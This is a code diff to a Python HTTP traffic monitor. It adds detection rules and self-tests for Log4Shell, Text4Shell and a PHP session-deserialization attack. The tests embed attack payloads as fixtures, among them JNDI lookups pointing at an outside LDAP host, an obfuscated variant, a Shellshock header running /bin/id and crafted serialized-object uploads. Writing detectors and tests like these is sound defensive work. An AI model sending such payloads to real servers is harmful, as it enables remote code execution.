@@ -16592,9 +16592,9 @@ def _ssdp_selftest():
 # --------------------------------------------------------------------------
 # Layer 7, cleartext only: once TLS completes the HTTP layer is ciphertext, so SNI /
 # ALPN / JA3 / certificates stay TLS Watch's and Cert Watch's. Engine vendored as
-# python/httpwatch.py (+ httpwatch_selftest.py, 1465 checks; v4); this adapter owns the
+# python/httpwatch.py (+ httpwatch_selftest.py, 1748 checks; v5); this adapter owns the
 # capture (one bounded tcpdump window, -w only, never a probe) and feeds each scapy
-# packet through the engine's own dissect_packet() + HttpWatch.feed(). 39 codes:
+# packet through the engine's own dissect_packet() + HttpWatch.feed(). 42 codes:
 #   A  HTTP/1.x framing ambiguity (request smuggling / desync, HTTP-001..011): one
 #      RFC 9112 grammar engine runs a Content-Length framer and a Transfer-Encoding
 #      framer side by side; HTTP-009 (critical) fires when they end the message at
@@ -16628,11 +16628,26 @@ def _ssdp_selftest():
 #      serves no h2c), so silence on a TLS-end-to-end deployment is not evidence of
 #      safety. A sign-out Referer reaching any other non-allowlisted page is a
 #      corroborating counter only (toolshell_signout_nonallowlisted), never an alert.
+#      v5 adds Log4Shell (HTTP-091, CVE-2021-44228 / CVE-2021-45046) and Text4Shell
+#      (HTTP-092, CVE-2022-42889): a dangerous lookup (jndi; script / url / dns) reaching a
+#      field the library interpolates. The obfuscation IS the library's own substitution
+#      grammar, so ${${lower:j}ndi:...} is evaluated by a walker held against the real
+#      engines, not string-matched. Carriers are fixed-decoding only (headers, cookies,
+#      target, path, query, Basic credentials); bodies are never scanned. A walker that
+#      hits its nesting/expansion cap says so (walker_budget_exceeded), never passes
+#      silently. Pairs with LDAP Watch's JNDI-delivery rule (the LDAP callback leg).
 #   F  (v3) attack-shaped request bodies (dechunked, multipart and urlencoded, every
 #      part decoded every plausible way): React2Shell Flight property-path reference
 #      (HTTP-082, CVE-2025-55182 / CVE-2025-66478), Spring4Shell class.* bean path
 #      (HTTP-083, CVE-2022-22965 / CVE-2010-1622), Struts S2-046 multipart filename
-#      OGNL (HTTP-085, CVE-2017-5638). v4: Exchange ProxyShell / ProxyNotShell
+#      OGNL (HTTP-085, CVE-2017-5638). v5: phpAfterShell (HTTP-089, CVE-2026-126714) - a
+#      PHP serialized-object header in a multipart parameter PHP's upload-progress
+#      handler stores in the session, decoded with PHP's measured rules (last duplicate
+#      wins, no OWS before '=', filename* ignored); `stored` records whether a non-file,
+#      non-empty part precedes it (PHP's necessary storage condition). Delivery only:
+#      the torn session write and the deserialization are not on the wire. A bare
+#      serialized scalar is a corroborating counter (php_scalar_record_shape), never an
+#      alert. v4: Exchange ProxyShell / ProxyNotShell
 #      (HTTP-087, CVE-2021-34473 / CVE-2022-41040) - the explicit-logon strip moves an
 #      autodiscover-routed request off the autodiscover handler; keyed on the strip, not
 #      the target, so the re-encoded targets that beat Microsoft's rewrite mitigations
@@ -16845,7 +16860,11 @@ def _http_analyze(packets, ports):
             # corroborating only (v4): a SharePoint sign-out Referer reaching a page off
             # the default allowlist other than ToolPane - never an alert on its own.
             'toolshell_signout_nonallowlisted':
-                int(st.get('toolshell_signout_nonallowlisted', 0))}
+                int(st.get('toolshell_signout_nonallowlisted', 0)),
+            # v5: corroborating PHP scalar-record shapes (never an alert), and lookup-
+            # walker cap hits - a capped walk is reported, never a silent pass.
+            'php_scalar_record_shape': int(st.get('php_scalar_record_shape', 0)),
+            'walker_budget_exceeded': int(st.get('walker_budget_exceeded', 0))}
 
 
 def _http_capture(iface, seconds, ports):
@@ -16885,7 +16904,7 @@ def do_http_watch(interface=None, seconds=20, ports=None, pcap=None, quick=False
     (always redacted), slow-read abuse, the PHP session-cookie memory leak, attack-
     shaped requests (Shellshock, Java4Shell, Struts S2-045 / S2-046, Spring4Shell,
     React2Shell, Exchange ProxyLogon / ProxyShell / ProxyNotShell, SharePoint
-    ToolShell), Brotli block-switch violations (armed only on a patched host
+    ToolShell, phpAfterShell, Log4Shell, Text4Shell), Brotli block-switch violations (armed only on a patched host
     libbrotli; see result['brotli']) and h2c / gRPC abuse (Rapid Reset,
     CONTINUATION, HPACK, gRPC header and metadata). Dual-stack. HIGH / CRITICAL
     findings feed Watchtower unless quick or replaying a pcap."""
@@ -16932,11 +16951,12 @@ def do_http_watch(interface=None, seconds=20, ports=None, pcap=None, quick=False
 
 
 def _http_selftest():
-    """Self-test HTTP Watch: the vendored engine's own 1465-check suite, focused
+    """Self-test HTTP Watch: the vendored engine's own 1748-check suite, focused
     smuggling / clean / credential-redaction / WinRM-suppression / HTTP.sys Range
     boundary scenarios, the v3 attack-shaped request rules (Shellshock, Struts
-    S2-045, Spring4Shell) and the v4 Exchange / SharePoint rules (ProxyLogon,
-    ProxyShell / ProxyNotShell, ToolShell) each with a near-miss, Brotli arming, the
+    S2-045, Spring4Shell), the v4 Exchange / SharePoint rules (ProxyLogon,
+    ProxyShell / ProxyNotShell, ToolShell) and the v5 phpAfterShell / Log4Shell /
+    Text4Shell rules, each with a near-miss, Brotli arming, the
     verdict ladder,
     the catalog shape, the Watchtower normalizer, and a Scapy pcap end-to-end leg
     through do_http_watch carrying an IPv6 extension header."""
@@ -17093,6 +17113,61 @@ def _http_selftest():
        'HTTP-088' not in {f.code for f in feed(sp(b'/_layouts/15/start.aspx',
                                                   b'/_layouts/SignOut.aspx'))})
 
+    # v5: phpAfterShell - a serialized-object header in a stored multipart parameter.
+    # `stored` reflects PHP's necessary condition (a non-file, non-empty part first);
+    # OWS before '=' means PHP never sees the parameter, so it stays silent.
+    obj = b'O:8:\\"stdClass\\":0:{}'
+
+    def php_mp(parts):
+        body = b''.join(b'------pb\r\n' + h + b'\r\n\r\n' + v + b'\r\n' for h, v in parts)
+        body += b'------pb--\r\n'
+        return (b'POST /s.php HTTP/1.1\r\nHost: x\r\nCookie: PHPSESSID=abc\r\n'
+                b'Content-Type: multipart/form-data; boundary=----pb\r\n'
+                b'Content-Length: %d\r\n\r\n' % len(body)) + body
+    prog = (b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', b'tok')
+
+    def filep(disp):
+        return (b'Content-Disposition: form-data; ' + disp + b'\r\nContent-Type: text/plain',
+                b'd')
+    fs = feed(php_mp([prog, filep(b'name="f1"; filename="x|' + obj + b'"')]))
+    ck('http089_phpaftershell_stored',
+       any(f.code == 'HTTP-089' and f.evidence.get('stored') is True
+           and 'CVE-2026-126714' in f.cves for f in fs)
+       and 'PHPSESSID=abc' not in json.dumps([f.to_dict() for f in fs], default=str))
+    fs = feed(php_mp([filep(b'name="f1"; filename="x|' + obj + b'"')]))
+    ck('http089_nothing_precedes_not_stored',
+       any(f.code == 'HTTP-089' and f.evidence.get('stored') is False for f in fs))
+    ck('http089_ows_before_equals_silent',
+       'HTTP-089' not in {f.code for f in feed(php_mp(
+           [prog, filep(b'name="f1"; filename ="x|' + obj + b'"')]))})
+    ck('http089_ordinary_upload_silent',
+       'HTTP-089' not in {f.code for f in feed(php_mp(
+           [prog, filep(b'name="f1"; filename="rapport final.pdf"')]))})
+
+    # v5: Log4Shell / Text4Shell - the substitution grammar is walked, so the
+    # obfuscated form fires; a body quoting the string is never scanned.
+    def hdr(name, value):
+        return b'GET / HTTP/1.1\r\nHost: v\r\n' + name + b': ' + value + b'\r\n\r\n'
+    fs = feed(hdr(b'User-Agent', b'${jndi:ldap://203.0.113.7:1389/a}'))
+    ck('http091_log4shell',
+       any(f.code == 'HTTP-091' and 'CVE-2021-44228' in f.cves for f in fs))
+    ck('http091_obfuscated_lower_lookup',
+       'HTTP-091' in {f.code for f in feed(hdr(b'X-Api-Version',
+                                               b'${${lower:j}ndi:ldap://h/a}'))})
+    ck('http091_ipv6_parity',
+       'HTTP-091' in {f.code for f in feed(hdr(b'Referer', b'${jndi:dns://h/a}'),
+                                           src='fd00::9', dst='fd00::5')})
+    jb = b'{"ua":"${jndi:ldap://h/a}"}'
+    ck('http091_body_never_scanned',
+       'HTTP-091' not in {f.code for f in feed(
+           b'POST /log HTTP/1.1\r\nHost: v\r\nContent-Type: application/json\r\n'
+           b'Content-Length: %d\r\n\r\n' % len(jb) + jb)})
+    ck('http091_plain_dollar_brace_silent',
+       'HTTP-091' not in {f.code for f in feed(hdr(b'User-Agent', b'${java:version}'))})
+    ck('http092_text4shell',
+       any(f.code == 'HTTP-092' and 'CVE-2022-42889' in f.cves
+           for f in feed(hdr(b'User-Agent', b'${script:javascript:1}'))))
+
     # Tier G (v3): Brotli arming is always reported; a refused library raises. When
     # the host decoder is patched, a valid br body decodes clean and stays silent.
     _probe, _bst = _http_brotli()
@@ -17131,11 +17206,11 @@ def _http_selftest():
        and _http_verdict([], True) == 'clean'
        and _http_verdict([], False) == 'no-traffic')
 
-    # catalog shape: 39 codes over tiers A-G (v4); every attributed CVE is pinned in
+    # catalog shape: 42 codes over tiers A-G (v5); every attributed CVE is pinned in
     # the catalog with a score; nothing deferred is also attributed.
     attributed = {c for d in hw.FINDING_REGISTRY.values() for c in d.cves}
     ck('catalog_shape',
-       len(hw.FINDING_REGISTRY) == 39
+       len(hw.FINDING_REGISTRY) == 42
        and {d.tier for d in hw.FINDING_REGISTRY.values()}
        == {'A', 'B', 'C', 'D', 'E', 'F', 'G'}
        and all(hw.CVE_CATALOG.get(c, {}).get('score') for c in attributed)
@@ -17149,7 +17224,7 @@ def _http_selftest():
        nrm['severity'] == 'HIGH' and nrm['klass'] == 'EXPOSURE'
        and nrm['src'] == '192.168.1.9' and nrm['code'] == 'HTTP-040')
 
-    # the vendored engine's own full suite (1465 checks). Its counters are module
+    # the vendored engine's own full suite (1748 checks). Its counters are module
     # globals, so reset them first or a second panel run would accumulate; it
     # prints a report, so capture that so do_routing_selftest stays quiet.
     try:
@@ -17179,6 +17254,8 @@ def _http_selftest():
         clean = b'GET / HTTP/1.1\r\nHost: intranet\r\n\r\n'
         shock = (b'GET /cgi-bin/test.cgi HTTP/1.1\r\nHost: nas\r\n'
                  b'Referer: () { :;}; /bin/id\r\n\r\n')
+        log4 = (b'GET /api HTTP/1.1\r\nHost: app\r\n'
+                b'X-Api-Version: ${${lower:j}ndi:ldap://203.0.113.7/a}\r\n\r\n')
         toolshell = (b'POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit HTTP/1.1\r\n'
                      b'Host: sp.corp\r\nReferer: /_layouts/SignOut.aspx\r\n'
                      b'Content-Length: 0\r\n\r\n')
@@ -17193,6 +17270,8 @@ def _http_selftest():
             / TCP(sport=40003, dport=80, flags='PA') / Raw(load=shock),
             Ether(**em) / IPv6(src='fd00::31', dst='fd00::6') / IPv6ExtHdrHopByHop()
             / TCP(sport=40004, dport=80, flags='PA') / Raw(load=toolshell),
+            Ether(**em) / IPv6(src='fd00::32', dst='fd00::7') / IPv6ExtHdrHopByHop()
+            / TCP(sport=40005, dport=8080, flags='PA') / Raw(load=log4),
         ]
         fd_, pth = _tf.mkstemp(suffix='.pcap', prefix='httpwatch_selftest_')
         _os.close(fd_)
@@ -17213,6 +17292,10 @@ def _http_selftest():
         ck('pcap_http088_ipv6_exthdr',
            any(f['code'] == 'HTTP-088' and f['af'] == 'ipv6'
                for f in rr.get('findings', [])))
+        ck('pcap_http091_ipv6_exthdr',
+           any(f['code'] == 'HTTP-091' and f['af'] == 'ipv6'
+               for f in rr.get('findings', [])))
+        ck('pcap_walker_budget_reported', 'walker_budget_exceeded' in rr)
         scapy_result = {'ran': True, 'findings': len(rr.get('findings', []))}
     except ImportError as e:
         scapy_result = {'ran': False, 'reason': str(e)}
